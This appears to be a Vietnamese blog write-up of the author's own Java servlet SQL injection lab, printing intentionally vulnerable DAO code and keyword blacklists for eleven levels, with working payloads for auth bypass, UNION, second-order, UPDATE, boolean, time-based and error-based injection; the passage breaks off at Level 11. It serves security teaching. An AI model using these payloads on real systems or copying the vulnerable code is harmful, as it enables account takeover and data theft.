---
title: Java Servlet Sql Injection Vulnerability by @Phatmh
categories: [pentesting, Web-Exploitation]
tags: [Web]
---

# Java Servlet Sql Injection Vulnerability by @Phatmh

### Tổng quan cấu trúc file java
  
```  
+---.idea
   +---dataSources
+---.mvn
   +---wrapper
+---src
   +---main
      +---java
         +---sql_injection
             +---controller
             +---dao
             +---model
             +---util
      +---resources
         +---META-INF
      +---webapp
          +---WEB-INF
   +---test
       +---java
       +---resources
+---target
    +---classes
       +---META-INF
       +---sql_injection
           +---controller
           +---dao
           +---model
           +---util
    +---generated-sources
       +---annotations
    +---Sql_Injection-1.0-SNAPSHOT
        +---META-INF
        +---WEB-INF
            +---classes
                +---META-INF
                +---sql_injection
                    +---controller
                    +---dao
                    +---model
                    +---util
```

![image](https://hackmd.io/_uploads/S16Q8BvYxx.png)    

    Cấu trúc của project được viết bằng mô hình MVC với UserDAO là nơi xử lý logic chính. Tại đây mình tạo ra 11 level tương ứng với các độ khó khác nhau. Ở đây basic sẽ là 1-5 và 6-11 sẽ là hard.

### Source Code (Github)
[Github](https://github.com/pzhat/Sql_Injection_Lab) 

### Tiến hành phân tích cách level và POC

#### Level 1
  <summary>SQL Injection Level 1</summary>
    
  ![image](https://hackmd.io/_uploads/H1KLMNBwxe.png)
    
```sql 
     public User loginLevel1(String username, String password) throws Exception {
        String query = "SELECT username, password FROM users WHERE username='" + username +
                "' AND password=MD5('" + password + "')";
        System.out.println("DEBUG SQL Level 1: " + query);
        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {
            if (rs.next()) return new User(rs.getString(1), rs.getString(2));
        }
        return null;
    }
```
- Hàm loginLevel1 nhận vào username và password, sau đó kiểm tra xem có người dùng nào trùng khớp không bằng cách truy vấn CSDL.
- Nếu đúng, trả về User object chứa username và password. Nếu không, trả về null.

```
String query = "SELECT username, password FROM users WHERE username='" + username +
            "' AND password=MD5('" + password + "')";
```
- Biến username và password được nối trực tiếp vào chuỗi truy vấn SQL mà không qua kiểm tra hay escape, gây ra lỗ hổng SQLi.
- Hàm MD5('password') là để so sánh mật khẩu đã mã hóa MD5. Nhưng attacker hoàn toàn có thể bypass với đoạn SQL payload logic.

Ở đây ta sử dụng payload là username='OR 1=1 -- và password là cái gì cũng được vì nó sẽ luôn trả về True vì mình xài boolean luôn true mà vì thế nó sẽ trả về hết bảng ở đây mình đã để khi bypass nó sẽ đăng nhập vào cái user đầu tiên trên bảng.

![image](https://hackmd.io/_uploads/H1nc5ESvxl.png)

Khi thực hiện truy vấn SQL, điều kiện WHERE luôn đúng → Đăng nhập thành công với tài khoản đầu tiên trong bảng users.

![image](https://hackmd.io/_uploads/ByH-s4HPex.png)

![image](https://hackmd.io/_uploads/B1BfsNBvle.png)

![image](https://hackmd.io/_uploads/ry7sTESvlg.png)

Thành công bypass qua Level 1 bằng cách dùng `'` để bypass qua logic cộng chuỗi.

#### Level 2
  <summary>SQL Injection Level 2</summary>
    
  Đến với LV2 thì bây giờ developer đã sử dụng thêm một số biện pháp bảo vệ nhưng vẫn có thể dễ dàng bypass qua vì ở đây dev chỉ bảo vệ bằng cách sử dụng dấu `"` để bọc lại câu SQL.

![image](https://hackmd.io/_uploads/HyARoESwel.png)

```sql    
 public User loginLevel2(String username, String password) throws Exception {
        String query = "SELECT username, password FROM users WHERE username=\"" + username +
                "\" AND password=MD5(\"" + password + "\")";
        System.out.println("DEBUG SQL Level 2: " + query);
        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {
            if (rs.next()) return new User(rs.getString(1), rs.getString(2));
        }
        return null;
    }
```
Hàm loginLevel2 vẫn là hàm xác thực người dùng bằng username và password, so sánh với password mã hóa MD5 trong CSDL. Cách thức hoạt động hoàn toàn giống với loginLevel1, nhưng cú pháp chuỗi trong SQL đã thay đổi từ 'single quotes' thành "double quotes"

![image](https://hackmd.io/_uploads/r1j2grrvgl.png)

Tiến hành test thử câu payload của lv1 vào lv2 để xem nó có bypass được không.

![image](https://hackmd.io/_uploads/r1CAgrSDgl.png)

Trả về fail chứng tỏ đã dính lỗi ở phần payload vì ở đây dấu `'` đã không còn được dùng thay vào đó dấu `"` đã được dùng để bọc câu SQL.
Vậy nên để có thể bypass được lv2 ta sẽ dùng dấu `"` để escape ra khỏi chuỗi để tạo nên một chuỗi SQL hoàn chỉnh.

![image](https://hackmd.io/_uploads/rJlmfrSDgx.png)

Ở đây mình sử dụng payload `" OR 1=1 -- -` với password là 1 hoặc cái gì cũng được hết lúc này câu truy vấn sẽ thành `SELECT username, password FROM users WHERE username="" OR 1=1 -- " AND password=MD5("1")
` Với phần password đã bị comment lại.

![image](https://hackmd.io/_uploads/ByeqGrBwex.png)

![image](https://hackmd.io/_uploads/B1ZAzHrDge.png)

Thành công login vào user admin.

#### Level 3
  <summary>SQL Injection Level 3</summary>
    
![image](https://hackmd.io/_uploads/ryPg4HSDgx.png)

```sql    
    public User loginLevel3(String username, String password) throws Exception {
        String query = "SELECT username, password FROM users WHERE username=LOWER('" + username + "') AND password=MD5('" + password + "')";
        System.out.println("DEBUG SQL Level 3: " + query);
        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {
            if (rs.next()) return new User(rs.getString(1), rs.getString(2));
        }
        return null;
    } 
```
    
Đến với lv3 ở đây có lẽ vẫn không có sự khac biệt mấy so với lv1 lv2 có thể thấy sự khác biệt duy nhất là `username=LOWER('" + username + "')` ở đây dev sử dụng LOWER để lowercase hết username trong sql nhưng hàm này ngoài tác dụng đó ra thì nó không hề làm gì thêm để phòng thủ.

![image](https://hackmd.io/_uploads/SJAfdrHPex.png)

Tiến hành thử lại payload cũ.

![image](https://hackmd.io/_uploads/HkJNuBrDxg.png)

Dính liền phải lỗi `Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1` dựa theo lỗi này thì có vẻ gần dấu `'` có vấn đề.
Ta có thể nhìn thấy ngay rằng hàm LOWER() khi ta dùng payload cũ nó chỉ cắt được chuỗi đoạn `LOWER(''` chứ ta chưa hề đóng lại hàm để nó nhận rằng là một hàm hoàn chỉnh nên ta sẽ tiến hành sửa lại payload.

![image](https://hackmd.io/_uploads/SkCUKBHDll.png)

Sử dụng payload này sẽ giúp ta đi qua đc LOWER và sau đó là toán tử OR cùng với -- để comment hết tất cả đoạn truy vấn ở sau.

![image](https://hackmd.io/_uploads/B16cKBSwle.png)

![image](https://hackmd.io/_uploads/B14CYHBwxl.png)

Thành công đăng nhập vào.

#### Level 4
  <summary>SQL Injection Level 4</summary>
    
  ![image](https://hackmd.io/_uploads/S1nU5BBPle.png)

```sql    
 public User loginLevel4(String username, String password) throws Exception {
        String[] sqlKeywords = {
                "union", "select", "from", "insert", "update", "delete",
                "drop", "create", "alter", "order by", "group by", "having",
                "where", "or", "and", "exec", "execute", "sp_", "xp_",
                "--", "/*", "*/", ";", "char", "nchar", "varchar", "nvarchar",
                "waitfor", "delay", "benchmark", "sleep"
        };

        String usernameLower = username.toLowerCase();
        String passwordLower = password.toLowerCase();

        for (String keyword : sqlKeywords) {
            if (usernameLower.contains(keyword) || passwordLower.contains(keyword)) {
                throw new Exception("SQLI detected");
            }
        }

        username = username.replace("\"", "").replace("'", "");
        password = password.replace("\"", "").replace("'", "");
        String query = "SELECT username, password FROM users WHERE username=\"" + username + "\" AND password=MD5(\"" + password + "\")";
        System.out.println("DEBUG SQL Level 4: " + query);

        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)){
            if (rs.next()) return new User(rs.getString(1), rs.getString(2));
        }
        return null;
    }
```
Đến với lv4 anh dev đã fix lỗi bằng cách sử dụng hàm `replace()` để loại bỏ các dấu `''` và dấu `""` trong câu truy vấn vậy nên ta sẽ không thể truyền dấu nháy để ta thoát khỏi câu truy vấn.

![image](https://hackmd.io/_uploads/Bymf1UHwll.png)

![image](https://hackmd.io/_uploads/rJ6zyUrvxe.png)

Dính ngay login fail.
Vậy ngoài 2 dấu kia ra liệu mình có cách nào để escape khỏi câu truy vấn không?.
Câu trả lời là có, trong mysql mặc định của nó sẽ cho phép sử dụng dấu `\` để escape trong câu truy vấn vậy nên ta sẽ tận dụng nó để exploit.
Dấu \ sẽ escape dấu " tiếp theo → dấu " trở thành ký tự thường trong chuỗi, không còn là ký tự đóng chuỗi"
Nếu mình escape được dấu `"` ta có thể thêm ở phần password để payload trở thành `SELECT username FROM users WHERE username="\" AND password=MD5(" OR 1=1 -- -")`
Sau khi escape, parser SQL sẽ hiểu thành: username="\ AND password=MD5(" OR 1=1 -- -")
Phần -- - comment phần cuối, chỉ còn điều kiện OR 1=1 → luôn đúng
Kết quả: bypass authentication thành công

Ở đây mình sẽ xài payload là `username = \` với phần password là ` OR 1=1 -- -`

![image](https://hackmd.io/_uploads/Sy-_lIBPgg.png)

![image](https://hackmd.io/_uploads/Syo_lLrvxx.png)

Thành công khai thác được sqli ở lv này.

#### Level 5
  <summary>SQL Injection Level 5</summary>
    
 ![image](https://hackmd.io/_uploads/BydUzISvll.png)
    
```sql    
public User getUserByUsername(String username) throws Exception {
        String query = "SELECT username, password FROM users WHERE username='" + username + "'";
        System.out.println("DEBUG GetUser: " + query);
        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {
            if (rs.next()) {
                return new User(rs.getString("username"), rs.getString("password"));
            }
        }
        return null;
    }
```
Đến với lv5 thì ở đây mình chỉ code một đoạn sql đơn giản như lv đầu nhưng vấn đề là nếu như có thêm 1 phần xác thực user ví dụ như nó bắt buộc user là admin thì phải làm sao.
vậy nên cách tấn công UNION based là cách hiệu quả nhất ở đây.

![image](https://hackmd.io/_uploads/BJBdKaSwgg.png)

Ở đây mình sẽ dùng payload là `' UNION SELECT 'admin', 'NULL' -- -` với password là bất kì thứ gì cũng được vì phần pass đã bị commented lại.

![image](https://hackmd.io/_uploads/ByfptTrvgx.png)

Thành công truy vấn đăng nhập bằng cách sử dụng UNION ở đây dùng UNION ở đây câu query sau khi bị inject sẽ là `SELECT username, password FROM users WHERE username='' UNION SELECT 'admin', 'NULL' -- ';
`

![image](https://hackmd.io/_uploads/rJ6CjaHwgg.png)

#### Level 6
  <summary>SQL Injection Level 6</summary>
    
  ![image](https://hackmd.io/_uploads/rJPGiCSDxg.png)
    
```sql
 public String getContentById(String id) throws Exception {
        String query = "SELECT content FROM posts WHERE id=" + id;
        System.out.println("DEBUG GetContent: " + query);
        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {
            return rs.next() ? rs.getString(1) : "Not found";
        }
    }
```

Đến với lv6 là lv đầu tiên của advance .

![image](https://hackmd.io/_uploads/HkTVjArvll.png)

`SELECT content FROM posts WHERE id=...`

- Mình kiểm soát biến id
- Không có dấu ' trong truy vấn (id không nằm trong dấu nháy)
- Kết quả được hiển thị bên trong một iframe.
Ở đây thử thách sẽ là làm sao để lấy được version của database ra từ đó có thể biết được loại database để tìm đường tấn công.
Bây giờ ta sẽ thử một payload trước xem liệu kết quả có trả về database version không.

![image](https://hackmd.io/_uploads/B1hEn0Hwgl.png)

`1 UNION SELECT @@version -- -` Ở đây trong câu query không hề có dấu '' nên ta có thể inject thẳng vào luôn tiến hành submit để xem có gì được trả về.

![image](https://hackmd.io/_uploads/H1LTn0BPge.png)

Nó chỉ đưa cho ta một câu như này chứ không có kết quả của việc lấy được database version ra, vậy vấn đề là nằm ở đâu. Sau một lúc tìm hiểu thì có vẻ như vì id=1 có giá trị nên sẽ không trả về được theo ý mình mà nó sẽ chỉ trả thông tin vì thế ta sẽ sửa một chút ở payload `9999 UNION SELECT @@version -- -` ở đây id=9999 sẽ trả về rỗng và chuỗi sql sau sẽ được thực thi.

![image](https://hackmd.io/_uploads/SJ0Y6CSwgl.png)

![image](https://hackmd.io/_uploads/Hy_qpCHDgg.png)

Thành công lấy ra được version của Mysql.

![image](https://hackmd.io/_uploads/BkrC6ABDxl.png)

#### Level 7
  <summary>SQL Injection Level 7</summary>
    
  ![image](https://hackmd.io/_uploads/S1p8ByLveg.png)

Đến với lv7 có thể thấy khá là nhiều chức năng ở lv này bao gồm register login cà view profile vậy lám sao ta tận dụng để tấn công sqli.

![image](https://hackmd.io/_uploads/SyxmrlIwex.png)

```sql    
 public boolean registerUser(String username, String password) throws Exception {
        String query = "INSERT INTO users (username, password) VALUES (?, MD5(?))";
        System.out.println("DEBUG RegisterUser: " + query);
        try (Connection conn = DBConnection.getConnection();
             PreparedStatement ps = conn.prepareStatement(query)) {
            ps.setString(1, username);
            ps.setString(2, password);
            return ps.executeUpdate() > 0;
        }
    }

```

![image](https://hackmd.io/_uploads/HkOVHxLPgg.png)


```sql
 public String getEmailByUsername(String username) throws Exception {
        String query = "SELECT email FROM users WHERE username='" + username + "'";
        System.out.println("DEBUG GetEmail: " + query);
        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {
            return rs.next() ? rs.getString(1) : "Not found";
        }
    }
```

`registerUser(String username, String password)
`
Dữ liệu username được lưu vào CSDL y nguyên như bạn nhập (kể cả có ', --, UNION, ...)
`String query = "SELECT email FROM users WHERE username='" + username + "'";
`
- username lấy từ session (đã lưu khi login) → chính là chuỗi đã đăng ký
- Có nối trực tiếp vào SQL mà không escape → SQL Injection gián tiếp (second-order) xảy ra tại đây.

![image](https://hackmd.io/_uploads/SJ06Hl8Pgx.png)

Tiến hành tạo tài khoản là admin/admin123![image](https://hackmd.io/_uploads/Bk1lUeUDlg.png)

Có vẻ như tên admin đã tồn tại trong bảng.
Bước 1: Đăng ký tài khoản với payload SQLi
username là `' UNION SELECT password FROM users --  
'
` 
password là cái gì cũng được.

![image](https://hackmd.io/_uploads/BkNPKgLPlx.png)

![image](https://hackmd.io/_uploads/BJ7dKlIDle.png)

Độ dài: 43 ký tự vừa VARCHAR(50)
Sẽ trả về password của user đầu tiên trong bảng users (thường là admin)

Bước 2: Thực hiện view profile mình vừa mới tạo, lúc này câu query sẽ trở thành `SELECT email FROM users WHERE username='' UNION SELECT password FROM users -- '
` Kết quả: rs.getString(1) = password dòng đầu tiên trong bảng users

![image](https://hackmd.io/_uploads/SJULceIDlg.png)

Thành công lôi mật khẩu dạng md5 của admin ra.

![image](https://hackmd.io/_uploads/H1xqcx8wgg.png)

#### Level 8
  <summary>SQL Injection Level 8</summary>

  ![image](https://hackmd.io/_uploads/Hyho9l8Dlx.png)
  
Lv 8 nó có tên là UPDATE Injection vì ở lv này mình sẽ demo sqli bằng cách sử dụng hàm UPDATE để thay đổi password của admin.
    
```sql
 public boolean updateEmail(String email, String username) throws Exception {
        String query = "UPDATE users SET email='" + email + "' WHERE username='" + username + "'";
        System.out.println("DEBUG UpdateEmail: " + query);
        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement()) {
            return stmt.executeUpdate(query) > 0;
        }
    }
```
Đây là SQLi điểm yếu chính, vì:
- Cả email và username không được lọc
- Query được tạo bằng nối chuỗi trực tiếp
Ý tưởng tấn công
Inject qua username, để câu lệnh UPDATE trở thành `UPDATE users SET email='[payload]' WHERE username='[injected_username]'
`

![image](https://hackmd.io/_uploads/ByYh1WIDxl.png)

![image](https://hackmd.io/_uploads/rkLakZLPel.png)

Bây giờ tiến hành payload vào Update email `admin', password=MD5('hacked') -- ` lúc này câu query sẽ trở thành `UPDATE users SET email='admin', password=MD5('hacked') WHERE username='admin' --'
` vì ở phần update email không hề có validate và cũng không bắt nó phải giống như một email bình thường.

![image](https://hackmd.io/_uploads/BJWfZ-LPll.png)

![image](https://hackmd.io/_uploads/ryM7Zb8wee.png)

![image](https://hackmd.io/_uploads/ByWUb-IDge.png)

Bây giờ ta sẽ test thử coi liệu password của admin đã được chuyền thành `hacked` hay chưa.

![image](https://hackmd.io/_uploads/r1Vt-ZLveg.png)

Thành công login vào admin.
PS: ở đây với mỗi lần thực thi được sqli ở lv 12345 mình login được vào admin luôn vì hàm `re.next` sẽ lấy và đăng nhập với user đầu tiên trên bảng và cũng chính là admin.

#### Level 9
  <summary>SQL Injection Level 9</summary>
    
![image](https://hackmd.io/_uploads/SkPu5jkuee.png)

```sql
 public User loginLevel9(String username, String password) throws Exception {
        String[] sqlKeywords = {
                "union", "select", "from", "insert", "update", "delete",
                "drop", "create", "alter", "order by", "group by", "having",
                "where", "or", "and", "exec", "execute", "sp_", "xp_"
        };

        String usernameLower = username.toLowerCase();
        String passwordLower = password.toLowerCase();

        System.out.println("DEBUG: usernameLower = " + usernameLower);
        System.out.println("DEBUG: passwordLower = " + passwordLower);

        for (String keyword : sqlKeywords) {
            if (usernameLower.contains(keyword) || passwordLower.contains(keyword)) {
                throw new Exception("SQLI detected (matched keyword: " + keyword + ")");
            }
        }

        username = username.replace("\"", "").replace("'", "");
        password = password.replace("\"", "").replace("'", "");

        String query = "SELECT username, password FROM users WHERE username=\"" + username +
                "\" AND password=MD5(\"" + password + "\")";

        System.out.println("DEBUG: Executing query = " + query);
        lastQuery = query;

        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {

            if (rs.next()) {
                return new User(rs.getString(1), rs.getString(2));
            }
        }

        return null;
    }
```

ở đây tôi để là level 9.
Ngay ở đoạn đầu mình đã dùng `String` để tạo ra một black list về những hàm query nguy hiểm có thể được sử dụng để khai thác sql injection.

```java 
String[] sqlKeywords = {
                "union", "select", "from", "insert", "update", "delete",
                "drop", "create", "alter", "order by", "group by", "having",
                "where", "or", "and", "exec", "execute", "sp_", "xp_"
        };
```

Sau đó thì user input sẽ được đưa về lowercase hết cụ thể ở đây là username và password nó sẽ được lowercase để bắt lỗi nếu xài payload kiểu `uNiOn` hoặc `SEL**ECT`.
Vậy ở đây ta sẽ phải khai thác như thế nào, sau một lúc test và tìm hiểu thì có 2 cách có thể hoạt động được ở lv này đó là Time Based Sqli và Boolean Based Sqli về Time-Based ta sẽ lợi dụng hàm `sleep()` để khiến cho hệ thống ngủ trong một khoảng thời gian nào đó nếu điều kiện trả về là true. Còn với Boolean-Based ta sẽ lợi dụng bằng cách so sánh điều kiện nếu đúng nó sẽ trả về true sai thì trả về false.
Cách khai thác thì vẫn sẽ giống như chall trước chỉ khác rằng bây giờ ta sẽ dùng payload làm sao để tránh được filter mà vẫn tìm ra được giá trị như tên bảng hoặc nội dung bên trong bảng.

#### Tiến hành test thử payload và debug
Đầu tiên là trường hợp của time base 

![image](https://hackmd.io/_uploads/BkR7vEetll.png)

Ở đây thì cái trường hợp nó tương tự với chall trước nên ở phần username mình vẫn sẽ inject `\` vào để escape sau đó payload sẽ được tiêm vào ở password.
Ở đây payload ở password mình sẽ dùng là:

```sql
|| CASE WHEN ASCII(SUBSTRING(DATABASE(),1,1))=115 THEN SLEEP(5) ELSE 0 END#
```

![image](https://hackmd.io/_uploads/ryXZsVxKxe.png)

![image](https://hackmd.io/_uploads/rJrXs4eFeg.png)

Ở đây có thể thấy nó có sleep nhưng lại bị sleep khá là lâu, sau khi tìm hiểu thử nguyên nhân thì:
MD5() nhận expression, mà SLEEP(5) lại có side-effect (delay).
Trong quá trình tính toán MD5, MySQL engine có thể gọi lại nhiều lần → mỗi lần lại sleep 5 giây.
Tổng cộng bạn thấy nó như “sleep vô hạn”, thực chất là sleep nhiều lần liên tục.
Ở đây nó sleep liên tục 55s tuy lâu nhưng có vẻ payload chạy đúng với ascii là 115=s vậy ta biết tên của bảng bắt đầu với chữ s.
Bây giờ ta thử với trường hợp là ascii là 114 thử xem liệu nó có sleep không để củng cố.

![image](https://hackmd.io/_uploads/Hkvk3NeYgg.png)

![image](https://hackmd.io/_uploads/r1VenEeFge.png)

Có thể thấy với ascii=114 nó trả về trong 11milisec vậy nên có thể thấy rằng payload có hoạt động và ta hoàn toàn có thể dump được bảng ra với trường hợp này.

![image](https://hackmd.io/_uploads/SkMs3Eetee.png)

Vì thấy cái sleep có vấn đề về time nên tôi tìm kiếm thêm cách khác nữa và tìm ra được có cách sử dụng 1 với 0 để lấy kết quả là giá trị true false ở đây được gọi là boolean base.

![image](https://hackmd.io/_uploads/HJYY64gFeg.png)

Với trường hợp boolean base này mình sử dụng payload:

```sql
\&password=|| (ASCII(SUBSTRING(DATABASE(),1,1))=115)#
```

|| → trong MySQL là toán tử logical OR

SUBSTRING(DATABASE(),1,1) → lấy ký tự đầu tiên của tên database hiện tại.

ASCII(...) → chuyển ký tự đó sang mã ASCII.

=115 → so sánh có bằng 115 (chữ s) không.

(ASCII(...) = 115) → kết quả sẽ là 1 nếu đúng, 0 nếu sai.

![image](https://hackmd.io/_uploads/BJHJRVlKxx.png)

Trong trường hợp ascii là 115 hay là chữ s thì ta được trả về true.

![image](https://hackmd.io/_uploads/SykYA4xKlx.png)

Bây giờ ta sử dụng thử giá trị khác thì sẽ như nào.

![image](https://hackmd.io/_uploads/rkS9R4gFgg.png)

Với giá trị là 114 thì logic sẽ false và nó đưa về login failed.

![image](https://hackmd.io/_uploads/Skda0NlYlx.png)

Test với mysql có thể thấy 2 trường hợp nó trả về 1 với 0 tương ứng true và false vậy nên ta hoàn toàn có thể lợi dụng để thực hiện dump bảng ở đây là tôi dump tên bảng và ta có thể dùng cách là manual test như mình đang làm hoặc dùng python payload để đó auto test.

#### Level 10
  <summary>SQL Injection Level 10</summary>
    
  ![image](https://hackmd.io/_uploads/rJUH1T_Pel.png)
Ở lv này tôi đã filter hết lại UNION là một hàm query rất hay sử dụng để khai thác sqli.
```java
String[] blockedKeywords = {
                "union", "--", "/*", "*/"
        };
```
![image](https://hackmd.io/_uploads/HJ2qJGcwxl.png)

```sql
public User loginLevel10(String username, String password) throws Exception {
        if (username == null || password == null) return null;

        String inputLower = username.toLowerCase();
        String[] blockedKeywords = { "union", "--", "/*", "*/" };
        for (String keyword : blockedKeywords) {
            if (inputLower.contains(keyword)) return null;
        }

        String query = "SELECT username, password FROM users WHERE username = '" + username +
                "' AND password = '" + password + "'";
        System.out.println("DEBUG SQL Level 10: " + query);

        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {
            if (rs.next()) return new User(rs.getString("username"), rs.getString("password"));
        }
        return null;
    }
```

Ở đây thì UNION đã bị dính filter vậy ta có hướng nào để có thể khai thác sqli bài này.
Ở chall này mình sẽ thử khai thác theo kiểu blind trong trường hợp mình không biết tên bảng có mấy hàng mấy cột và bị filter UNION.
Việc đầu tiên có lẽ phải tìm cách để enum ra được cái tên bảng:
Ở đây mình sẽ xài error base sqli để tìm thử tên bảng.
```sql
username=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) AND 'x'='x
```
Mục tiêu ban đầu là dùng EXTRACTVALUE để gây lỗi 
- CONCAT(0x7e, DATABASE(), 0x7e)
- 0x7e = ~ (ký tự dấu ngã)
- DATABASE() = tên database hiện tại
- CONCAT(...) = nối chuỗi thành ``~database_name~``

EXTRACTVALUE(xml_frag, xpath_expr) là gì?
- Đây là một hàm xử lý XML trong MySQL, với:
- xml_frag: Một đoạn XML hợp lệ (ví dụ: '<b>value</b>')
- xpath_expr: Một biểu thức XPath dùng để lấy dữ liệu từ đoạn XML
Ví dụ:
SELECT EXTRACTVALUE(1, 'abc');
Nó sẽ gây lỗi và trả về là `XPATH syntax error: 'abc'`
Vậy nên ta sẽ lợi dụng lỗi đó để lấy ra được tên bảng nhờ vào CONCAT là một hàm nối chuỗi trong mysql nó ghép các string thành 1 string.

![image](https://hackmd.io/_uploads/B1MhXL9vxg.png)

Tiến hành inject username password.

![image](https://hackmd.io/_uploads/rklnpmLqvxg.png)

Kết quả cho ta thấy bảng ta đang được truy vấn đến là `sqli_lab`.

Tương tự ta extract version cũng như vậy username = `admin' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) AND 'x'='x` password là gì cũng được.

![image](https://hackmd.io/_uploads/HJP7EUcDlg.png)

Ta sẽ thử đếm số dòng trong bảng `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM users), 0x7e)) AND 'x'='x`

![image](https://hackmd.io/_uploads/Bkcq9UqPex.png)

11 dòng.
Từ đây ta có thể tiến hành bruteforce password của admin hoặc tìm thêm user khác tùy vào script.

#### Bonus Level 10
  <summary>SQL Injection Level 10 (Bonus)</summary>
    
![image](https://hackmd.io/_uploads/S15j8Ujwel.png)

Đây là giao diện đăng nhập như cũ nhưng bây giờ mình sẽ thử lấy payload cũ để vào xem nó có trả kết quả như trước không.

![image](https://hackmd.io/_uploads/rJnRIIiPxg.png)

![image](https://hackmd.io/_uploads/r1HJPIsDxe.png)

Bây giờ nó sẽ chỉ trả về invalid cho tất cả trường hợp bị lỗi.
Ở chall này bây giờ mình muốn thử một cách đó là sử dụng time based attack sqli kĩ thuật này sẽ dựa vào thời gian trả về response để dump ra được nội dung của bảng.
Ở đây ta sẽ test thử một câu truy vấn time base đơn giản xem liệu nó có nhận hay không.
`admin' AND (SELECT SLEEP(5) FROM users LIMIT 1)='`

![image](https://hackmd.io/_uploads/ByGUn9jwel.png)

| Thành phần                             | Giải thích                                                                                                                   |
| -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `'admin'`                              | Đóng chuỗi username hợp lệ.                                                                                                  |
| `AND`                                  | Điều kiện bổ sung — ta đang tiêm thêm logic vào truy vấn.                                                                    |
| `(SELECT SLEEP(5) FROM users LIMIT 1)` | Subquery: thực hiện lệnh `SLEEP(5)` — tức là **server sẽ "ngủ" 5 giây** trước khi trả kết quả.                               |
| `= ''`                                 | So sánh kết quả của `(SELECT SLEEP(5))` với chuỗi rỗng `''`. Dù vô lý về mặt logic, vẫn hợp lệ cú pháp SQL.                  |
| **Tác dụng chính**                     | Nếu server có lỗ hổng SQLi và đoạn chèn được thực thi, thì server sẽ **delay 5 giây**, cho thấy **SQLi time-based tồn tại**. |

![image](https://hackmd.io/_uploads/SJzs39oweg.png)

![image](https://hackmd.io/_uploads/Skqs3csDgx.png)

Thành công biết được rằng là bị dính time base sqli vì có thể thấy response mất 5 giây mới trả về kết quả.
Bây giờ ta sẽ thử đếm số bảng bằng phương pháp trên xem sao.
`admin' AND (SELECT SLEEP(5) WHERE (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())<3)='`
| Thành phần                                                                     | Mục đích                                                                                      |
| ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------- |
| `admin'`                                                                       | Đóng chuỗi `'username'` trong câu lệnh SQL gốc (giả sử có cấu trúc `WHERE username = '...'`). |
| `AND`                                                                          | Bổ sung điều kiện logic cho truy vấn gốc.                                                     |
| `(SELECT SLEEP(5) WHERE (...))`                                                | Nếu điều kiện `(...)` đúng, thì `SLEEP(5)` sẽ thực thi (tức là **server delay 5 giây**)       |
| `SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()` | Đếm số bảng (`table`) trong schema (CSDL) hiện tại.                                           |
| `< 3`                                                                          | Kiểm tra xem số bảng hiện tại có ít hơn 3 hay không.                                          |
| `= ''`                                                                         | So sánh với chuỗi rỗng, mục đích là để giữ cú pháp SQL hợp lệ.                                |

![image](https://hackmd.io/_uploads/Byr7C5iweg.png)

![image](https://hackmd.io/_uploads/r16m0qiPxl.png)

Thời gian trả về trên khẳng định rằng có ít hơn 3 bảng trong database.

![image](https://hackmd.io/_uploads/BJkO09sDxe.png)

Thử với bé hơn 2 và bé hơn 1 cho thời gian trả về rất nhanh nghĩa là có khả năng nó bằng 2 hoặc là nó bằng 1 bảng bây giờ ta thử với bằng 2 xem thế nào.

![image](https://hackmd.io/_uploads/ryLPZiovll.png)

Thử với bằng 2 và khẳng định được có 2 bảng nằm trong database.
Với lỗi này nếu mình lợi dụng thêm script để brute thì ta hoàn toàn có thể dump ra được thông tin trong bảng ra.

#### Level 11: Filter hết các hàm đã sử dụng
  <summary>SQL Injection Level 11</summary>
  Ở challenge này thì các hàm đã được sử dụng bên trên đã bị chặn đi bây giờ ta phải tìm hướng đi khác để có thể bypass được.
    
```sql
 public User loginLevel11(String username, String password) throws Exception {
        String[] sqlKeywords = {
                "union", "select", "from", "insert", "update", "delete",
                "drop", "create", "alter", "order by", "group by", "having",
                "where", "or", "and", "exec", "execute", "sp_", "xp_", "case", "when", "ascii", "substring", "then",
                "sleep", "end"
        };

        String usernameLower = username.toLowerCase();
        String passwordLower = password.toLowerCase();

        System.out.println("DEBUG: usernameLower = " + usernameLower);
        System.out.println("DEBUG: passwordLower = " + passwordLower);

        for (String keyword : sqlKeywords) {
            if (usernameLower.contains(keyword) || passwordLower.contains(keyword)) {
                throw new Exception("SQLI detected (matched keyword: " + keyword + ")");
            }
        }

        username = username.replace("\"", "").replace("'", "");
        password = password.replace("\"", "").replace("'", "");

        String query = "SELECT username, password FROM users WHERE username=\"" + username +
                "\" AND password=MD5(\"" + password + "\")";

        System.out.println("DEBUG: Executing query = " + query);
        lastQuery = query;

        try (Connection conn = DBConnection.getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query)) {

            if (rs.next()) {
                return new User(rs.getString(1), rs.getString(2));
            }
        }

        return null;
    }
```
    
##### Hướng tiếp cận Error Based
Sau một lúc thì tôi muốn thử cách error base xem liệu có lấy ra được cái gì trong mysql không vậy nên tiến hành tìm và sửa payload để hợp với cách tấn công dùng backslash để có thể escape và truyền payload vào.

Ở đây tôi sử dụng payload là:

```sql
username = \
```
```sql 
